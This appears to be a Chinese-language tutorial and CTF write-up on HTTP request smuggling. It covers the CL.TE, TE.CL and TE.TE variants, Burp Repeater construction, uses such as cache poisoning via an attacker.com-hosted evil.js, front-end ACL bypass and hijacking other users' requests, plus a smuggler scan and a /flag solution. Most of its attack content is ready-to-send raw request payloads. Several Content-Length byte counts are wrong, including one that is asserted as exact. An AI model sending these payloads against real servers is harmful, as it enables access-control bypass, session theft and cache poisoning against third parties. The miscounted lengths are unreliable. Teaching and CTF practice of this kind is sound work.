---
comments: true
---

# 请求走私

## 漏洞原理：一个请求，两种"长度"

HTTP 请求走私（HTTP Request Smuggling）出现在 **前端服务器 + 后端服务器** 的架构里：CDN、Nginx、HAProxy 等前端负责接收用户请求，再转发给后端的应用服务器（Flask、Tomcat、Gunicorn……）。为了复用连接、提高性能，前端会把多个用户的请求拼在 **同一条 TCP 连接** 里连续发给后端。

问题在于：HTTP/1.1 有两种声明请求体长度的方式——

- `Content-Length: n`：请求体有 n 个字节；
- `Transfer-Encoding: chunked`：请求体分块传输，每块开头是十六进制长度，以 `0\r\n\r\n` 结束。

如果 **前端和后端对"这个请求到哪里结束"理解不一致**，后端就会把前端认为"属于下一个请求"的字节，拼接到当前请求上——攻击者藏在请求体里的走私报文（smuggled request）就被后端当成新请求处理了。这些字节会"粘"在 **下一个到达的用户请求** 前面，这就是"走私"这个名字的由来：你以为发的是一个请求，后端却执行了第二个。

按前后端各自采用哪种解析方式，分为三种成因。

### CL.TE：前端看 Content-Length，后端看 chunked

前端用 `Content-Length` 确定边界，把整个报文（含走私部分）原样转发；后端优先认 `Transfer-Encoding: chunked`，读到 `0\r\n\r\n` 就认为请求结束，剩下的字节留给下一个请求。

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 13
Transfer-Encoding: chunked

0

G
```

前端认为请求体是 13 字节（`0\r\n\r\nG`），全部转给后端；后端读到 `0` 块就认为请求结束了，多出的 `G` 被拼接在下一个用户请求开头——下一个受害者请求会变成 `GGET / ...` 之类，返回异常或泄露信息。

### TE.CL：前端看 chunked，后端看 Content-Length

反过来：前端优先认 chunked，后端只认 `Content-Length`。

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

前端把 `5c`（92 字节）整块读完，再读 `0` 结束块，认为整个报文是一个请求；后端只认 `Content-Length: 4`，认为请求体只有 `\r\n5c` 之后的一小段，剩下的 `GPOST / ...` 全部被当作下一个请求处理——一个完整的走私 POST 就被注入到了连接里。

> 实际发包时，`5c` 这个长度要自己数准，多一个少一个字节后端都会卡住或报错，这是手工走私最容易翻车的地方。

### TE.TE：两边都认 chunked，但混淆其中一个

前后端都支持 `Transfer-Encoding`，但可以通过混淆 `Transfer-Encoding` 头，让 **其中一台服务器"看不见"它**，退回到 `Content-Length`。常见的混淆手法：

- `Transfer-Encoding: xchunked`（改大小写/加字符）
- `Transfer-Encoding : chunked`（冒号前加空格）
- `Transfer-Encoding: chunked` 写两遍，值不同
- `Transfer-Encoding:\tchunked`（用 Tab）
- 头名前加空格，把它"折"进上一个头里

例如前端对非法头宽容、解析出 chunked，后端丢弃这个畸形头、退回 `Content-Length`，就退化成了 TE.CL。这类差异没有统一规律，全靠对目标组合逐个 fuzz。

## Burp Repeater 手工构造完整示例

以 CL.TE 为例，目标场景：前端 Nginx 代理后端 Gunicorn，走私一个 `GET /admin`。

先在 Repeater 里做两件事：

1. 右键菜单 **取消勾选「Update Content-Length」**，否则 Burp 会自动修正长度，走私报文就失效了；
2. 把请求降级为 **HTTP/1.1**（Inspector 里改，或直接写 `HTTP/1.1`），HTTP/2 不走这套长度语义，无法走私。

然后构造报文。我们想让后端把下面这段拼到下一个请求前面：

```http
GET /admin HTTP/1.1
Host: example.com
```

拼接后的完整 Repeater 报文如下：

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 56
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: example.com
X: x
```

手工数一下 `Content-Length`：`0\r\n\r\n`（5 字节）+ `GET /admin HTTP/1.1\r\n`（20）+ `Host: example.com\r\n`（19）+ `X: x\r\n`（6）+ 结尾补一个 `\r\n`（2）= 52 上下，数错就改到不报错为止——这也是为什么练手时推荐先用 `G` 这种单字节走私验证差异存在，再上完整请求。

发送两次：第一次自己只看到正常响应；**第二次（相当于"下一个用户"的请求）会拿到 `/admin` 的内容**，或者看到 `X: x` 前面的异常。在真实环境里，这个"下一个请求"就是别的受害者。

TE.CL 的验证方法类似，把上面的 `GET /admin` 换成单字节 `G`，观察第二个请求是否出现 `Unrecognized method GGET` 之类的报错即可。

> 小技巧：走私探测可能把连接搞"毒化"（后端连接池里的其他用户请求被破坏），在靶场里放心试，在真实目标上要收着点。

## 利用面

请求走私本身只是"注入了一个请求"，危害取决于你走私的请求能干什么。三类典型利用：

### 缓存投毒

如果链路上有缓存（CDN、Nginx `proxy_cache`），可以走私一个请求让后端返回恶意内容，再诱导缓存把这份响应 **绑定到别人的请求 URL 上**。例如走私 `GET /static/evil.js HTTP/1.1\r\nHost: attacker.com`，让受害者请求 `/static/app.js` 时拿到被替换的恶意 JS——一次走私，污染所有访问者。这本质上是「缓存投毒」章节的触发手段之一：走私负责"让缓存存下不该存的响应"，缓存投毒负责放大影响，两章内容互相呼应，建议对照阅读。

### 绕过前端鉴权

很多架构里，"安全"是靠前端做的：Nginx 上写死 `location /admin { deny all; }`，或 WAF 拦截敏感路径，后端裸奔。走私的请求 **不经过前端的 ACL 判断**（前端只看到外层那个合法请求），直接落到后端，于是 `/admin`、内部接口、管理面板全部可达。这也是 CTF 里最常见的出题点。

### 劫持其他用户请求

走私的字节会拼到 **下一个到达的请求** 前面。利用这一点可以：

- 让受害者的请求头被"吃掉"（比如走私报文故意留下超长的头部，把后面用户请求的内容吞进自己的 `Content-Length` 里），把别人的 Cookie、CSRF Token 反射到你控制的响应或日志里；
- 配合反射型输入点，把走私内容拼到受害者请求里造成存储型 XSS——受害者访问正常页面时触发，可结合「XSS攻击」章的思路理解杀伤链。

## 检测思路与工具

手工探测的核心思路是 **"埋一个标记，看下一个请求"**：先发单字节走私（`G`），观察后续请求是否报错或响应变化；再用 `Content-Length: 5` / `Transfer-Encoding: chunked` 组合做超时检测（CL.TE 场景下发 `0` 块不结尾，后端会一直等剩下的字节，响应明显变慢）。注意先用无害请求确认差异，再上完整 payload，避免把连接池打挂影响判断。

工具方面：

- **smuggler（defparam）**：Python 脚本，对目标批量跑 CL.TE / TE.CL / TE.TE 及各种头混淆变体，出结果快，适合初步扫描：

```bash
python3 smuggler.py -u https://example.com
```

- **Burp 扩展「HTTP Request Smuggler」**：图形化，支持探测和走私发送，配合 Repeater 手工调长度最顺手；
- **Burp Suite 内置 Scanner**（较新版本）也集成了走私检测，DAST 模式下自动跑差异探测。

工具的局限要心里有数：它们主要检测标准变体，对冷门服务器组合或需要特定路径才能触发的场景覆盖有限，CTF 里往往还得回到 Repeater 手工数字节。

## CTF 例题：smuggle 到 /flag

题目描述：一个站点前置 Nginx，访问 `/flag` 提示 `Forbidden by frontend`，后端是 Flask。要求拿到 flag。

### 第一步：确认前端拦截

直接访问：

```http
GET /flag HTTP/1.1
Host: ctf.example.com
```

返回 `403 Forbidden by frontend`。说明 `/flag` 被 Nginx 的 ACL 挡了，但后端很可能没有做鉴权——典型的"绕过前端鉴权"场景。

### 第二步：探测走私差异

在 Repeater 中关闭 Update Content-Length，发 CL.TE 探测报文：

```http
POST / HTTP/1.1
Host: ctf.example.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

连发两次。第二次请求返回 `400 Bad Request`，错误信息里出现 `GGET`——后端的下一个请求被拼上了 `G`，说明 **后端优先认 chunked，前端看 Content-Length**，CL.TE 成立。

### 第三步：走私 /flag

构造走私报文，把 `GET /flag` 埋进 chunked 结束块之后：

```http
POST / HTTP/1.1
Host: ctf.example.com
Content-Length: 46
Transfer-Encoding: chunked

0

GET /flag HTTP/1.1
Host: ctf.example.com

```

`Content-Length` 数法：`0\r\n\r\n`（5）+ `GET /flag HTTP/1.1\r\n`（19）+ `Host: ctf.example.com\r\n`（22）= 46，正好。

发两次。第一次正常响应；第二次响应里出现：

```http
HTTP/1.1 200 OK
Content-Type: text/html

flag{http_smuggl3_byp4ss_fr0nt3nd}
```

### 总结解题思路

这类题的套路是固定的三步：

1. 看到"前端拦、后端裸"的架构（`Forbidden by frontend`、Nginx + 应用服务器），先想到走私；
2. 用单字节 `G` 探测 CL.TE 和 TE.CL 哪个成立——报 `GGET` 类错误即差异存在；
3. 把敏感路径作为完整请求走私进去，发两次，第二次拿结果。

如果单字节探测没有反应，再试 TE.TE 的头混淆变体，或者换 smuggler 跑一遍确认。长度数不对、Burp 自动改了 `Content-Length`、目标其实是 HTTP/2，是这道题最常见的三个翻车点。
